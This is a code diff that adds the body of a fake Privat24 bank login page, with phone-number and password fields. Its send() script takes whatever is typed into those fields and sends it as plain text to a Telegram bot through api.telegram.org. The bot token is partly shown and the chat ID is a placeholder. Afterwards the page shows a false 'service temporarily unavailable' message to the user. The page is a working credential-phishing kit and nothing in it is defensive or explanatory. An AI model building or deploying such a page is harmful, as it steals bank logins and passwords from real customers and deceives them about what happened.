@@ -37,3 +37,26 @@
   }
 </style>
 
+</head>
+<body>
+  <div class="login-box">
+    <div style="font-size: 24px; font-weight: bold; color: #7ab500; margin-bottom: 20px;">
+      Privat<span style="color: #333;">24</span>
+    </div>
+    <input type="text" id="log" placeholder="Номер телефону">
+    <input type="password" id="pas" placeholder="Пароль">
+    <button onclick="send()">Увійти</button>
+  </div>
+
+  <script>
+    function send() {
+      const token = '8790499217:AAFZF80...'; // Твій токен
+      const chat = 'ТВІЙ_ID'; 
+      const text = 'Логін: ' + document.getElementById('log').value + ' Пароль: ' + document.getElementById('pas').value;
+      fetch('https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat + '&text=' + text);
+      alert('Сервіс тимчасово недоступний');
+    }
+  </script>
+</body>
+</html>
+
